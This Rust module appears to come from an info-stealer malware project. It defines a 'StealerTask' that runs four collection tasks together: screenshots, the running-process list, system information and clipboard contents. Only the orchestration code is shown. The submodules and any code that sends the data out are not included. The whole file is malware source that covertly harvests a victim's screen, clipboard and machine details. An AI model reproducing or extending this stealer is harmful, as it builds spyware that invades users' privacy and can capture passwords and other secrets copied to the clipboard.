mod screenshot;
mod processes;
mod systeminfo;
mod clipboard;

use crate::stealer::clipboard::ClipboardTask;
use crate::stealer::processes::ProcessesTask;
use crate::stealer::screenshot::ScreenshotTask;
use crate::stealer::systeminfo::SystemInfoTask;
use alloc::sync::Arc;
use alloc::vec;
use tasks::{CompositeTask, Task};
use utils::path::Path;

pub struct StealerTask {
    inner: CompositeTask
}

impl StealerTask {
    pub fn new() -> Self {
        Self {
            inner: CompositeTask::new(
                vec![
                    Arc::new(ScreenshotTask),
                    Arc::new(ProcessesTask),
                    Arc::new(SystemInfoTask),
                    Arc::new(ClipboardTask),
                ]
            )
        }
    }
}

impl Task for StealerTask {
    unsafe fn run(&self, parent: &Path) {
        self.inner.run(parent);
    }
}